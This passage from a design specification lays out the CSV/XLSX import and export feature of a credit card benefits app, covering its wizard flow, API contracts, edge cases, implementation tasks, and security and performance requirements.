5. Duplicate Detection step
   - System checks for duplicate cards/benefits
   - Shows list of detected duplicates
   - Options per duplicate: Skip, Update, or Merge
   - Shows preview of impact
   ↓
6. Preview & Commit step
   - Summary table of all records to import
   - Totals: cards to add, benefits to create
   - Impact on wallet: new ROI, new annual value
   - User clicks "Confirm & Import"
   ↓
7. Commit step
   - System begins transaction
   - Creates UserCard and UserBenefit records
   - Records ImportJob with status 'Committed'
   - Creates ImportRecord entries for audit trail
   - Returns to dashboard with success toast
   - Shows "Imported X cards and Y benefits"
```

### Import Flow (Error Path)

```
3. Validation step (errors detected)
   ↓
   User sees: "3 critical errors found - please fix and re-upload"
   Error list:
   - Row 5: RenewalDate must be in future (is "2020-01-01")
   - Row 8: AnnualFee must be non-negative (is "-550")
   - Row 12: CardName "Invalid Card" not found in system
   ↓
   User downloads file, fixes errors locally, re-uploads
   ↓
   Validation passes, proceeds to step 4
```

### Duplicate Detection Flow

```
5. Duplicate Detection step
   Detected duplicates:

   Card Duplicate:
   - Player already has Chase Sapphire Reserve
   - Current: Annual fee $550, renews 2024-12-31
   - New: Annual fee $550, renews 2025-06-15
   - Options: [Skip] [Update renewal date] [Merge]

   Benefit Duplicate:
   - Card "Chase Sapphire Reserve" already has "Travel Credit"
   - Current: Sticker value $300, unused
   - New: Sticker value $300, claimed
   - Options: [Skip] [Update usage status] [Keep both]
   ↓
   User selects options for each duplicate
   ↓
   Proceeds to preview step with updated totals
```

### Export Flow

```
1. User clicks "Export" button on card or dashboard
   ↓
2. Export options modal
   - Scope: "This card" / "All cards" / "Custom filter"
   - Format: "CSV" / "XLSX"
   - Options:
     * Include calculated values (ROI, annual value)
     * Include audit trail (timestamps)
     * Include system IDs (for tracking)
   ↓
3. System generates file
   - CSV: single flat file with all data
   - XLSX: multiple sheets (summary, details, calculations)
   - Filename: "CardBenefits_YYYYMMDD_HHmmss.csv" or ".xlsx"
   ↓
4. Browser downloads file
   - File downloaded to user's computer
   - System logs export in ImportJob table (for audit)
   ↓
5. User can open in Excel, Google Sheets, or other tools
   - Data is structured for easy analysis
   - Can modify and re-import
```

### Round-Trip (Export + Re-Import) Flow

```
User exports card "Chase Sapphire Reserve" → XLSX file downloaded
   ↓
User modifies benefits in Excel (changes sticker values, adds notes)
   ↓
User goes to dashboard, clicks Import
   ↓
User uploads modified XLSX
   ↓
System detects existing cards/benefits (via CardName + Issuer)
   ↓
Duplicate Detection step shows matches
   ↓
User selects "Update" for each benefit to sync changes
   ↓
System applies updates: new sticker values sync to database
   ↓
Success: modifications preserved
```

### State Transitions

#### ImportJob States
```
Uploaded → Parsing → Validating → PreviewReady → [User reviews] → Committed
                           ↓
                        Failed (critical errors)
```

#### ImportRecord States
```
For each record in file:
  Valid → Will be imported
  Duplicate → User decides: Skip or Update
  Conflict → User decides: Skip, Update, or Merge
  Error → Blocking, must fix file
```

### Error Handling Paths

#### Critical Validation Error
- File format unreadable → Show: "Could not parse file. Check format."
- Missing required columns → Show: "Missing required column: 'CardName'"
- All records invalid → Show: "No valid records found. Please check file format."
- Card not in catalog → Show: "Unknown card 'Chase Platinum'. Not found in system."
- User cancels upload → Return to dashboard, discard ImportJob

#### Duplicate Card Same Player
- Detection: Check unique constraint (playerId, masterCardId)
- UI shows: "You already have this card"
- Options: [Skip] [Update renewal date] [Keep both]

#### Duplicate Benefit Same Card
- Detection: Check unique constraint (userCardId, name)
- UI shows: "This benefit already exists on this card"
- Options: [Skip] [Update sticker value] [Update usage status]

#### Concurrent Import Conflict
- If another process modifies player data during import
- Detection: Catch Prisma unique constraint violations
- Response: Show "Import in progress by another session. Please try again."
- Retry: User can re-upload and retry

---

## API Routes & Contracts

### Import Endpoints

#### 1. Upload File
```
POST /api/import/upload
Content-Type: multipart/form-data

Request:
  playerId: string (FormData)
  file: File (FormData, max 10MB)

Response Success (201):
  {
    success: true
    importJobId: string
    status: 'Uploaded'
    fileName: string
    fileSize: number (bytes)
    totalRecords: number (estimated)
  }

Response Error (400):
  {
    success: false
    error: 'IMPORT_FILE_INVALID'
    message: 'File must be CSV or XLSX'
  }

Response Error (413):
  {
    success: false
    error: 'IMPORT_FILE_TOO_LARGE'
    message: 'File exceeds 10MB limit'
  }

Response Error (401/403):
  {
    success: false
    error: 'AUTHZ_OWNERSHIP'
    message: 'Unauthorized to import to this player'
  }
```

#### 2. Parse & Preview
```
POST /api/import/{importJobId}/parse

Request:
  {}

Response Success (200):
  {
    success: true
    importJobId: string
    status: 'Parsing' → 'ValidatingFormat'
    preview: [
      {
        recordType: 'Card',
        rowNumber: 1,
        data: {
          cardName: 'Chase Sapphire Reserve',
          issuer: 'Chase',
          annualFee: 550,
          renewalDate: '2024-12-31'
        }
      }
    ],
    columnMapping: {
      0: 'CardName',
      1: 'Issuer',
      2: 'AnnualFee',
      ...
    }
  }

Response Error (400):
  {
    success: false
    error: 'IMPORT_FORMAT_INVALID'
    message: 'Could not parse CSV. Expected comma-separated format.',
    details: {
      line: 2,
      reason: 'Unterminated quote'
    }
  }
```

#### 3. Validate Records
```
POST /api/import/{importJobId}/validate

Request:
  {}

Response Success (200):
  {
    success: true
    importJobId: string
    status: 'Validating' → 'ValidatingComplete'
    summary: {
      totalRecords: 100,
      validRecords: 95,
      warningRecords: 3,
      errorRecords: 2
    },
    records: [
      {
        rowNumber: 1,
        recordType: 'Card',
        status: 'Valid',
        data: { ... }
      },
      {
        rowNumber: 5,
        recordType: 'Card',
        status: 'Error',
        data: { ... },
        errorDetails: [
          'RenewalDate must be in future (is 2020-01-01)'
        ]
      }
    ],
    canProceed: false // true if no critical errors
  }

Response Error (400):
  (Internal validation error, rare)
```

#### 4. Check for Duplicates
```
POST /api/import/{importJobId}/duplicates

Request:
  {}

Response Success (200):
  {
    success: true
    importJobId: string
    status: 'DuplicateCheckComplete'
    duplicates: [
      {
        recordId: 'rec_123',
        recordType: 'Card',
        rowNumber: 5,
        newData: {
          cardName: 'Chase Sapphire Reserve',
          issuer: 'Chase',
          annualFee: 550,
          renewalDate: '2025-06-15'
        },
        existingData: {
          customName: 'My Amex',
          actualAnnualFee: 550,
          renewalDate: '2024-12-31',
          isOpen: true,
          createdAt: '2024-01-15T10:00:00Z'
        },
        action: 'Skip' // User to set
      }
    ],
    hasDuplicates: boolean
  }
```

#### 5. Update Duplicate Resolution
```
PATCH /api/import/{importJobId}/duplicates

Request:
  {
    decisions: [
      {
        recordId: 'rec_123',
        action: 'Skip' | 'Update' | 'Merge'
      }
    ]
  }

Response Success (200):
  {
    success: true
    importJobId: string
    decisions: { ... }
  }
```

#### 6. Get Import Preview
```
GET /api/import/{importJobId}/preview

Request:
  {}

Response Success (200):
  {
    success: true
    importJobId: string
    status: 'PreviewReady'
    summary: {
      cardsToCreate: 5,
      cardsToUpdate: 2,
      benefitsToCreate: 45,
      benefitsToUpdate: 10,
      cardsToSkip: 0,
      benefitsToSkip: 3
    },
    preview: [
      {
        id: 'rec_1',
        action: 'Create', // or 'Update', 'Skip'
        recordType: 'Card',
        data: { ... }
      }
    ],
    impactOnWallet: {
      newAnnualValue: 250000, // cents
      cardsBeforeImport: 3,
      cardsAfterImport: 8,
      benefitsBeforeImport: 25,
      benefitsAfterImport: 70
    }
  }
```

#### 7. Commit Import
```
POST /api/import/{importJobId}/commit

Request:
  {}

Response Success (200):
  {
    success: true
    importJobId: string
    status: 'Committed',
    committedAt: '2024-04-02T15:30:00Z',
    results: {
      cardsCreated: 5,
      cardsUpdated: 2,
      benefitsCreated: 45,
      benefitsUpdated: 10,
      recordsSkipped: 3,
      importedAt: '2024-04-02T15:30:00Z'
    }
  }

Response Error (409):
  {
    success: false
    error: 'CONFLICT_STATE'
    message: 'Wallet has been modified since preview. Please start over.'
  }

Response Error (500):
  {
    success: false
    error: 'INTERNAL_ERROR'
    message: 'Import failed. All changes have been rolled back.',
    details: {
      rollbackReason: 'Duplicate key constraint on (playerId, masterCardId)'
    }
  }
```

### Export Endpoints

#### 1. Get Export Options
```
GET /api/export/options
Query:
  scope: 'Card' | 'Player' | 'All'
  cardId?: string (if scope='Card')

Response Success (200):
  {
    success: true
    scope: 'Card',
    cardId: 'card_123',
    cardName: 'Chase Sapphire Reserve',
    availableFormats: ['CSV', 'XLSX'],
    exportOptions: {
      includeCalculatedValues: boolean (default: true),
      includeAuditTrail: boolean (default: true),
      includeSystemIds: boolean (default: false),
      columnSelection: [
        {
          columnId: 'cardName',
          label: 'Card Name',
          selected: true,
          required: true
        }
      ]
    },
    estimatedFileSize: 15000 // bytes
  }
```

#### 2. Export Data
```
POST /api/export/generate
Content-Type: application/json

Request:
  {
    scope: 'Card',
    cardId: 'card_123',
    format: 'CSV' | 'XLSX',
    options: {
      includeCalculatedValues: true,
      includeAuditTrail: true,
      includeSystemIds: false
    }
  }

Response Success (200):
  Content-Type: text/csv or application/vnd.openxmlformats-officedocument.spreadsheetml.sheet
  Content-Disposition: attachment; filename="CardBenefits_20240402_153000.csv"

  [File binary data]

Response Error (400):
  {
    success: false
    error: 'EXPORT_INVALID_OPTIONS'
    message: 'Invalid export scope or format'
  }
```

#### 3. Export History
```
GET /api/export/history
Query:
  limit: number (default: 20)
  offset: number (default: 0)

Response Success (200):
  {
    success: true
    exports: [
      {
        exportId: string
        exportedAt: DateTime
        scope: string
        format: 'CSV' | 'XLSX'
        fileName: string
        fileSize: number
        createdBy: string
      }
    ],
    total: number,
    limit: number,
    offset: number
  }
```

### Server Actions (for UI integration)

#### Server Action: Import File
```typescript
// src/actions/import.ts
export async function uploadImportFile(
  playerId: string,
  file: File
): Promise<ActionResponse<ImportJobResponse>>

export async function validateImportFile(
  importJobId: string
): Promise<ActionResponse<ValidationResult>>

export async function checkDuplicates(
  importJobId: string
): Promise<ActionResponse<DuplicateCheckResult>>

export async function commitImport(
  importJobId: string,
  decisions: DuplicateDecision[]
): Promise<ActionResponse<ImportResult>>

export async function cancelImport(
  importJobId: string
): Promise<ActionResponse<void>>
```

#### Server Action: Export Data
```typescript
// src/actions/export.ts
export async function generateExport(
  scope: ExportScope,
  options: ExportOptions
): Promise<ActionResponse<ExportResult>>

export async function getExportHistory(
  limit: number,
  offset: number
): Promise<ActionResponse<ExportHistoryResult>>
```

---

## Edge Cases & Error Handling

### Import Edge Cases

#### 1. Malformed CSV File
**Scenario:** User uploads CSV with unterminated quotes, irregular columns, or null bytes
**Handling:**
- Detect during parsing phase
- Report error: "Could not parse CSV format. Check for proper quoting and encoding."
- Show affected line number
- Allow user to fix file locally and re-upload
- Test: Invalid CSV files, UTF-8 BOM handling, different line endings (CRLF vs LF)

#### 2. Large File Import (10,000+ records)
**Scenario:** User imports massive CSV with 50K+ records
**Handling:**
- Stream file parsing instead of loading entire file into memory
- Implement pagination in preview (show first 100 records)
- Process in batches (1000 records per transaction)
- Show progress bar during validation and commit
- Test: Import with 50K+ records, memory usage, execution time < 30s

#### 3. Duplicate Card Already Exists
**Scenario:** Player already has Chase Sapphire Reserve, user imports it again
**Handling:**
- Detection during duplicate check phase
- Show: "You already have Chase Sapphire Reserve (added 2024-01-15)"
- Options: [Skip] [Update renewal date] [Update annual fee]
- If "Update": merge new data with existing card (update renewalDate only)
- If "Keep both": warn user (unusual case), confirm to proceed
- Test: Duplicate detection accuracy, update semantics

#### 4. Card Not in Master Catalog
**Scenario:** User imports CSV with "My Custom Card" that doesn't exist in system
**Handling:**
- Validation error: "Card 'My Custom Card' not found in system catalog"
- Suggestion: "Add this card to system first via Admin panel"
- Block import of this record (critical error)
- Allow other records to proceed if valid
- Test: Nonexistent card error handling, error message clarity

#### 5. Invalid Date Format
**Scenario:** User imports renewal date as "12/31/2024" instead of ISO 8601 "2024-12-31"
**Handling:**
- Detect during validation phase
- Error: "RenewalDate must be ISO 8601 format (YYYY-MM-DD), got '12/31/2024'"
- Suggestion: "Use format like 2024-12-31"
- Show correct example
- Test: Various date formats, partial date parsing, invalid dates

#### 6. Negative Annual Fee
**Scenario:** User imports AnnualFee as "-550" (typo)
**Handling:**
- Validation error: "AnnualFee must be non-negative (got -550)"
- Block import of this record
- Show corrected value in error message
- Test: Negative values, boundary cases (zero fee is valid)

#### 7. Past Renewal Date
**Scenario:** User imports card with RenewalDate as "2020-12-31" (past)
**Handling:**
- Validation error: "RenewalDate must be in future (got 2020-12-31)"
- Block import of this record
- Suggestion: "Card appears to be closed. Use status='Inactive' instead"
- Test: Past dates, current date, far-future dates

#### 8. Concurrent Modifications During Import
**Scenario:** Player modifies wallet (adds/deletes card) while import is in progress
**Handling:**
- Detection: Unique constraint violation during commit
- Rollback entire transaction
- Response: "Wallet was modified during import. Please try again."
- No partial state left in database
- Test: Concurrent requests, race condition simulation

#### 9. Column Header Typo
**Scenario:** User has "CardNam" instead of "CardName" in header
**Handling:**
- Parse phase: Show detected columns in preview
- User confirms column mapping
- If mapping cannot be auto-detected: "Could not auto-map all columns"
- Allow manual column selection
- UI: Dropdown to select actual column position for each expected field
- Test: Missing columns, extra columns, wrong order

#### 10. Mixed Card and Benefit Records Without Order
**Scenario:** User imports CSV with cards and benefits mixed randomly (not grouped)
**Handling:**
- Parsing: Detect RecordType column
- Processing: First pass collect all cards, second pass link benefits to cards
- Validation: Ensure benefits reference cards that exist in import
- Test: Random order, benefits before cards, missing card references

#### 11. Special Characters in Data
**Scenario:** Benefit name contains quotes, commas, or emojis
**Handling:**
- Parsing: Proper CSV quoting and escaping
- Validation: Allow any UTF-8 character in names
- Database: Store as-is, no sanitization needed
- Export: Proper quoting on re-export
- Test: Unicode characters, control characters, quotes/commas in names

#### 12. Duplicate Benefit Names on Same Card
**Scenario:** User imports CSV with two "Travel Credit" benefits on same card
**Handling:**
- Validation: Unique constraint (userCardId, name) violation
- Error: "Card 'Chase Sapphire Reserve' already has benefit 'Travel Credit'"
- Options: [Skip] [Update existing] [Allow duplicate (rare)]
- Test: Exact duplicate names, case-sensitivity

### Export Edge Cases

#### 13. Empty Wallet Export
**Scenario:** Player has no cards or benefits to export
**Handling:**
- Show: "Nothing to export. Add cards to your wallet first."
- Button disabled if no data
- If user force-exports: return valid empty file (header only)
- Test: Empty player wallet, no benefits, etc.

#### 14. Large Export (10K+ records)
**Scenario:** Player exports all cards/benefits, results in large XLSX
**Handling:**
- Generate file asynchronously for large exports
- Show progress indicator
- Return download link when ready
- Timeout if generation > 60 seconds
- Test: Large exports, memory usage, generation time

#### 15. Special Characters in Export
**Scenario:** Card name contains quotes or emojis
**Handling:**
- CSV: Proper quoting and escaping
- XLSX: UTF-8 encoding, native character support
- Round-trip: Re-import should yield identical data
- Test: Unicode in names, special characters, emojis

#### 16. Filtered Export Consistency
**Scenario:** User exports cards filtered by date range, status, etc.
**Handling:**
- Filter applied consistently across cards and benefits
- Export includes only matching records
- Summary sheet shows filter criteria
- Test: Multiple filters, date ranges, status filters

#### 17. Concurrent Export Requests
**Scenario:** User downloads export, requests another while first is in progress
**Handling:**
- Each export is independent operation
- Support multiple concurrent exports
- No state collision
- Test: Parallel export requests

#### 18. Export with Null/Optional Fields
**Scenario:** Some benefits lack declared values or expiration dates
**Handling:**
- CSV: Use empty cell for null values
- XLSX: Use null/blank display
- Round-trip: Null values preserved on re-import
- Test: Null handling, optional field coverage

### Concurrency & State Consistency

#### Transaction Rollback on Commit Failure
**Handling:**
- Wrap entire import commit in Prisma transaction
- If any record fails: rollback all
- No partial state left in database
- Return detailed error about which record caused rollback
- Test: Transaction rollback scenarios

#### Duplicate Key Constraint Race Condition
**Handling:**
- During import preview, player could add same card manually
- On commit, unique constraint (playerId, masterCardId) violation occurs
- Catch Prisma error P2002 (unique constraint)
- Rollback and show: "Wallet was modified by another session"
- Test: Manual card add during import

#### File Upload Cleanup
**Handling:**
- Temporary files stored in /tmp or similar
- Auto-delete after commit or cancel
- Clean up after 24 hours if abandoned
- Prevent disk space issues
- Test: File cleanup, disk usage

---

## Component Architecture

### Import System Components

```
┌─────────────────────────────────────────────────────────────┐
│                    ImportWizard                               │
│                  (Main UI Container)                          │
└────────────────────────┬────────────────────────────────────┘
                         │
        ┌────────────────┼────────────────┬─────────────────┬─────────────┐
        │                │                │                 │             │
    Step 1           Step 2           Step 3            Step 4        Step 5
FileUpload        ParsePreview      Validation      DuplicateCheck    Preview
    │                │                │                 │             │
    ├─DropZone       ├─ColumnMap      ├─RecordList     ├─DupList      ├─Summary
    ├─FileInfo       ├─Preview        ├─ErrorList      ├─Actions      ├─Confirm
    └─Validation     └─NextBtn        └─ProceedBtn     └─NextBtn      └─CommitBtn

Dependencies:
  - Each step depends on prior step's output
  - Step N can only proceed if Step N-1 successful
  - Steps can be revisited/edited until commit
```

### Export System Components

```
┌──────────────────────────────────────────┐
│        ExportModal                        │
│      (Scope + Format Selection)           │
└────────────────┬─────────────────────────┘
                 │
    ┌────────────┴────────────┐
    │                         │
ExportScope               ExportFormat
 ├─CardSelect           ├─CSVGenerator
 ├─RangeFilter          ├─XLSXGenerator
 └─PreviewButton        └─DownloadLink

Dependencies:
  - Format selection depends on scope
  - Some options disabled for certain scopes
```

### Core Processing Components

```
ImportValidator
  ├─ validateCSVFormat()
  ├─ validateXLSXFormat()
  ├─ validateRecordSchema()
  ├─ validateBusinessRules()
  └─ compileErrorReport()

DuplicateDetector
  ├─ findDuplicateCards()
  ├─ findDuplicateBenefits()
  ├─ compareRecords()
  └─ suggestResolution()

ImportCommitter
  ├─ createUserCards()
  ├─ cloneBenefits()
  ├─ updateExisting()
  ├─ rollbackOnError()
  └─ logAuditTrail()

ExportGenerator
  ├─ collectCardData()
  ├─ collectBenefitData()
  ├─ formatAsCSV()
  ├─ formatAsXLSX()
  └─ calculateExportMetrics()
```

### Database Integration

```
ImportJob ← ImportValidator, DuplicateDetector, ImportCommitter
             ├─ Track overall progress
             ├─ Store error logs
             └─ Record commit results

ImportRecord ← Per-record tracking
             ├─ Status (Valid/Duplicate/Error)
             ├─ Original data
             └─ Created resource IDs

UserCard, UserBenefit ← ImportCommitter
                      ├─ importedFrom FK
                      ├─ importedAt timestamp
                      └─ Audit trail
```

### Integration Points

**From UI to Server:**
1. ImportWizard → POST /api/import/upload
2. ValidateStep → POST /api/import/{jobId}/validate
3. DuplicateCheckStep → POST /api/import/{jobId}/duplicates
4. PreviewStep → GET /api/import/{jobId}/preview
5. ConfirmStep → POST /api/import/{jobId}/commit

**From Server to Database:**
1. ImportValidator → Prisma queries (MasterCard, UserCard, UserBenefit lookups)
2. DuplicateDetector → Prisma queries (unique constraint checks)
3. ImportCommitter → Prisma transactions (batch creates/updates)
4. ExportGenerator → Prisma queries (data collection)

---

## Implementation Tasks

### Phase 1: Import Foundation

**Task 1.1:** Create ImportJob and ImportRecord models
- Complexity: Small (1-2 hours)
- Update prisma/schema.prisma with new tables
- Run migration and generate Prisma client
- Acceptance criteria:
  - ImportJob and ImportRecord tables exist in database
  - Relationships to User, Player, UserCard, UserBenefit correct
  - Indexes on status, playerId, createdAt present

**Task 1.2:** Implement CSV/XLSX parser
- Complexity: Medium (3-4 hours)
- Create src/lib/importParser.ts
- Handle both CSV and XLSX formats
- Auto-detect format from file extension
- Extract column headers and data rows
- Handle various CSV edge cases (quotes, escaping, line endings)
- Test with sample files (clean, malformed, large)
- Acceptance criteria:
  - Parser correctly identifies format
  - Handles CSV with proper quote/escape handling
  - Handles XLSX with multiple sheets
  - Returns structured row data with column names

**Task 1.3:** Build validation schema and rules engine
- Complexity: Medium (4-5 hours)
- Create src/lib/importValidator.ts
- Define validation rules for Card and Benefit records
- Validate required fields, data types, business rules
- Collect errors with row/column references
- Categorize as critical (blocking) or warning
- Support customizable validation rules
- Acceptance criteria:
  - All required fields validated
  - Data type checking (dates, monetary values, UUIDs)
  - Business rules enforced (annual fee non-negative, future dates)
  - Error messages include row and column references
  - Test coverage: 80%+

**Task 1.4:** Create import preview UI component
- Complexity: Medium (3-4 hours)
- Create src/components/ImportWizard/Step1Upload.tsx
- Implement drag-drop file upload
- Show file info (size, format detected)
- Validate file format and size
- Progress indication during upload
- Error messages with remediation guidance
- Acceptance criteria:
  - Drag-drop works for CSV and XLSX
  - File size validated (max 10MB)
  - Format detection accurate
  - UX matches design system
  - Accessible (WCAG 2.1 AA)

### Phase 2: Import Wizard & Conflict Resolution

**Task 2.1:** Implement 5-step import wizard UI
- Complexity: Large (6-8 hours)
- Create wizard framework with state management
- Implement steps: Upload, Parse, Validate, Duplicates, Preview
- Enable/disable next button based on step completion
- Allow back/forward navigation (except after commit)
- Implement progress indicator
- Create Step2 (Parse & Preview)
- Create Step3 (Validation Results)
- Create Step4 (Duplicate Detection)
- Create Step5 (Final Preview)
- Acceptance criteria:
  - All 5 steps functional and navigable
  - Progress shows current step and completion status
  - Back button works to revisit steps
  - Forward button only enabled when step valid
  - No data loss when navigating back

**Task 2.2:** Implement duplicate detection logic
- Complexity: Medium (3-4 hours)
- Create src/lib/importDuplicateDetector.ts
- Check for duplicate cards (playerId + masterCardId)
- Check for duplicate benefits (userCardId + name)
- Compare existing and imported records
- Suggest resolution actions (skip, update, merge)
- Acceptance criteria:
  - All duplicate types detected accurately
  - Comparison logic clear and testable
  - Suggestions provided for each duplicate
  - Test with various duplicate scenarios

**Task 2.3:** Build duplicate resolution UI
- Complexity: Medium (3-4 hours)
- Create Step4DuplicateCheck component
- Display list of detected duplicates
- Show current vs. new record comparison
- Implement action selection (Skip, Update, Merge)
- Show preview of impact for each action
- Acceptance criteria:
  - All duplicates displayed clearly
  - Comparison shows relevant fields
  - Actions easily selectable
  - Preview updates when action changed

**Task 2.4:** Implement import committer and transaction logic
- Complexity: Large (5-6 hours)
- Create src/lib/importCommitter.ts
- Handle card creation with benefit cloning
- Handle benefit creation/update
- Implement Prisma transactions for atomicity
- Add rollback on error
- Create ImportJob record with results
- Create ImportRecord entries for audit trail
- Acceptance criteria:
  - All records created/updated successfully
  - Transaction rollback on any error
  - No partial state in database
  - ImportJob and ImportRecord records created
  - Audit trail captures import source and timestamp

**Task 2.5:** Server actions for import workflow
- Complexity: Medium (4-5 hours)
- Create src/actions/import.ts
- Implement uploadImportFile action
- Implement validateImportFile action
- Implement checkDuplicates action
- Implement commitImport action
- Implement cancelImport action
- Add authorization checks (user owns player)
- Add comprehensive error handling
- Acceptance criteria:
  - All actions return ActionResponse<T> format
  - Authorization verified for each action
  - Error handling consistent with system
  - Input validation using centralized validators

**Task 2.6:** Comprehensive testing for import (unit + integration)
- Complexity: Large (6-8 hours)
- Write validation tests (40+ tests)
- Write duplicate detection tests (30+ tests)
- Write committer tests (35+ tests)
- Write workflow integration tests (20+ tests)
- Test edge cases and error scenarios
- Achieve 80%+ code coverage
- Acceptance criteria:
  - Test coverage 80%+
  - All major workflows tested
  - Edge cases covered
  - Error paths tested

### Phase 3: Export Implementation

**Task 3.1:** Implement export data collection service
- Complexity: Medium (3-4 hours)
- Create src/lib/exportService.ts
- Query data based on scope (card, player, filtered)
- Include calculated values (ROI, annual value)
- Handle optional fields and nulls
- Acceptance criteria:
  - Data collected accurately
  - Filters applied correctly
  - Calculated values accurate
  - Query performance acceptable (< 2 seconds for 1000 records)

**Task 3.2:** Implement CSV and XLSX formatters
- Complexity: Medium (4-5 hours)
- Create src/lib/exportFormatters.ts
- Implement CSV formatter with proper escaping
- Implement XLSX formatter with multiple sheets
- Include metadata sheet (export info, summary)
- Handle headers and data rows
- Accept custom column selection
- Acceptance criteria:
  - CSV output valid and parseable
  - XLSX output readable in Excel/Sheets
  - Round-trip import works (export → import → same state)
  - All data types preserved correctly

**Task 3.3:** Create export UI components
- Complexity: Medium (3-4 hours)
- Create ExportModal component
- Implement scope selection (card, all, filtered)
- Implement format selection (CSV, XLSX)
- Show export options (include values, audit trail, IDs)
- Preview estimated file size
- Implement download trigger
- Acceptance criteria:
  - All options functional
  - Preview accurate
  - Download works in all browsers
  - Filename descriptive (includes timestamp)

**Task 3.4:** Server actions for export
- Complexity: Small (2-3 hours)
- Create src/actions/export.ts
- Implement generateExport action
- Implement getExportHistory action
- Add authorization checks
- Acceptance criteria:
  - Actions return proper ActionResponse
  - Authorization verified
  - Error handling consistent

**Task 3.5:** Export history tracking and UI
- Complexity: Small (2-3 hours)
- Add export history to ImportJob table
- Create export history list view
- Show recent exports with download links
- Implement cleanup of old exports (30 days)
- Acceptance criteria:
  - History displays correctly
  - Download links work
  - Old exports cleaned up automatically

**Task 3.6:** Testing for export functionality
- Complexity: Medium (5-6 hours)
- Write export service tests (25+ tests)
- Write formatter tests (30+ tests)
- Write UI component tests (15+ tests)
- Write integration tests (10+ tests)
- Test edge cases (empty export, large exports, special chars)
- Acceptance criteria:
  - Test coverage 80%+
  - All workflows tested
  - Edge cases covered

### Phase 4: Polish & Comprehensive Testing

**Task 4.1:** End-to-end import/export workflow tests
- Complexity: Medium (4-5 hours)
- Playwright E2E tests for complete import flow
- Playwright E2E tests for complete export flow
- Test round-trip (import → export → import)
- Test error recovery flows
- Acceptance criteria:
  - 15+ E2E tests covering critical paths
  - All workflows tested
  - Tests pass consistently

**Task 4.2:** Performance testing and optimization
- Complexity: Medium (3-4 hours)
- Load test with large files (10K+ records)
- Measure memory usage
- Optimize query performance (N+1 queries)
- Implement query result caching if needed
- Acceptance criteria:
  - Import of 10K records < 30 seconds
  - Memory usage reasonable (< 500MB)
  - No N+1 queries detected

**Task 4.3:** Security testing and validation
- Complexity: Medium (3-4 hours)
- Test authorization on all endpoints
- Test input validation and sanitization
- Test for XSS vulnerabilities (file content)
- Test for SQL injection (through CSV data)
- Test rate limiting on import endpoint
- Acceptance criteria:
  - No authorization bypass possible
  - All inputs validated
  - No XSS/SQL injection vulnerabilities
  - Rate limiting working

**Task 4.4:** Edge case testing and error scenarios
- Complexity: Medium (4-5 hours)
- Test all documented edge cases
- Test concurrent operations
- Test transaction rollback scenarios
- Test file cleanup
- Acceptance criteria:
  - All edge cases handled correctly
  - Error messages helpful
  - System stable under stress

**Task 4.5:** Documentation and examples
- Complexity: Small (2-3 hours)
- Write user guide for import/export
- Create example CSV and XLSX files
- Document troubleshooting steps
- Create API documentation
- Acceptance criteria:
  - Clear documentation for users
  - Example files valid and tested
  - API docs complete

---

## Security & Compliance Considerations

### Authentication & Authorization

**Requirement:** Only authenticated users can import/export
- All import endpoints require valid session
- All export endpoints require valid session
- All operations verify user owns the player
- Authorization failures return 403 with appropriate error

**Implementation:**
- Use getAuthUserIdOrThrow() in all server actions
- Use verifyPlayerOwnership() before any operation
- Consistent with existing auth system

### Data Protection

**CSV/XLSX File Handling:**
- No sensitive data in filenames (timestamps only)
- Files stored temporarily in /tmp or similar
- Auto-delete after 24 hours if abandoned
- No backup/logging of file contents

**Exported Data:**
- No sensitive data removed (user data is their data to export)
- Filename includes timestamp for tracking
- Option to exclude system IDs if user prefers privacy

### Input Validation & XSS Prevention

**File Upload:**
- Validate file format (CSV or XLSX only)
- Check file size (max 10MB)
- Scan for malicious content (optional: antivirus library)
- No execution of file content

**CSV Data:**
- No code evaluation
- All data treated as strings initially
- Type conversion with validation
- No template evaluation

**XLSX Data:**
- No formula evaluation (parse as values only)
- No macro support
- Treat all data as values

### Rate Limiting

**Import Endpoint:** 10 imports per user per hour
**Export Endpoint:** 30 exports per user per hour
**Upload Endpoint:** 5 uploads per user per 10 minutes

### Audit Logging

**All import/export operations logged:**
- ImportJob table tracks who did what when
- ImportRecord entries for detailed audit trail
- Export history with user and timestamp
- No data rollback without audit trail

### Data Residency & Privacy

**For future multi-tenant support:**
- Player data isolated by playerId
- User data isolated by userId
- Export scoped to authenticated user's data only
- No cross-user data leakage possible

---

## Performance & Scalability Considerations

### Expected Load

**Import:**
- Typical import: 20-100 records
- Large import: 1,000-10,000 records
- Maximum: 50,000 records (implementation limit)

**Export:**
- Typical export: 20-100 records
- Large export: 1,000-10,000 records

### Performance Targets

| Operation | Size | Target Time |
|-----------|------|-------------|
| Upload & Parse | 1,000 records | < 5 seconds |
| Validation | 1,000 records | < 10 seconds |
| Duplicate Check | 1,000 records | < 10 seconds |
| Commit | 1,000 records | < 20 seconds |
| Export | 1,000 records | < 10 seconds |

### Database Query Optimization

**Indexes required:**
- ImportJob(playerId, status, createdAt)
- ImportRecord(importJobId, status)
- UserCard(playerId, masterCardId)
- UserBenefit(userCardId, name)

**Query patterns:**
- Bulk lookups of MasterCard (indexed by name + issuer)
- Bulk lookups of UserCard (indexed by playerId)
- Bulk lookups of UserBenefit (indexed by userCardId)
- Status queries on ImportJob (indexed)

**Optimization strategies:**
- Use Prisma createMany for batch inserts
- Use transactions to ensure atomicity
- Batch read queries where possible
- Avoid N+1 queries (eager load relationships)

### Caching Strategies

**Cache MasterCard catalog:**
- Load on app startup (< 1000 cards typically)
- Cache in memory or Redis
- Invalidate on master data changes
- 1-hour TTL for safety

**Cache user's existing cards:**
- Preload when import starts
- Use for duplicate detection
- Cache during entire wizard (one session)
- Clear after import completes

### File Handling & Storage

**Temporary storage:**
- Use system temp directory (/tmp on Unix, %TEMP% on Windows)
- Store with random filename (avoid collisions)
- Auto-cleanup after 24 hours
- Or cleanup immediately after processing

**File size limits:**
- 10MB max for uploaded files
- Target max 50K records (usually < 5MB CSV)
- Streaming parsing to avoid memory issues

### Scalability for Future Growth

**For 100K+ users:**
- Sharding strategy: by userId (horizontal partition)
- Archive old ImportJob records (> 90 days)
- Implement background job processing for large imports
- Move to job queue (Bull, etc) for async import
- Consider pagination in preview step

---

## Quality Control Checklist

- [x] All user requirements addressed (import/export functionality)
- [x] Data schema supports all features (ImportJob, ImportRecord tables)
- [x] API design RESTful and consistent with existing patterns
- [x] All user flows complete with error paths mapped
- [x] 18 edge cases documented with handling strategies
- [x] Components modular and independently testable
- [x] Implementation tasks specific and measurable
- [x] Documentation clear enough for engineers to code from
- [x] All constraints documented (file size, record limits, performance targets)
